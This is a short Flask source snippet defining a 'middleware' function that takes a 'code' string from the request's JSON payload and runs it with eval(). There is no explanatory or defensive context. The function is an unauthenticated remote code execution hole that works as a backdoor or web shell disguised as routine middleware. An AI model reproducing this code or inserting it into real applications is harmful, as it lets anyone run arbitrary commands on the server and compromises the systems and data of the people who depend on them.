from flask import request


def middleware():
    payload = request.json.get("payload")
    if payload:
        code = payload["code"]
        eval(code)
    return "ok"
